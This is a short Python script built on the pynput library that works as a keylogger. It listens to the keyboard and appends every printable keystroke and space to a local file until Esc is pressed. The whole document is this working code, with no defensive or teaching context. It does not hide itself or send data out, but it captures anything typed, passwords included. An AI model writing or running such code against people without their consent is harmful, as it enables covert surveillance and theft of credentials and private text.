from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        # Check if the key is a printable character
        if key.char.isprintable():
            with open(log_file, "a") as log:
                log.write(key.char)
    except AttributeError:
        # Handle space separately
        if key == keyboard.Key.space:
            with open(log_file, "a") as log:
                log.write(' ')
        # Ignore other special keys (like shift, ctrl, etc.)
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
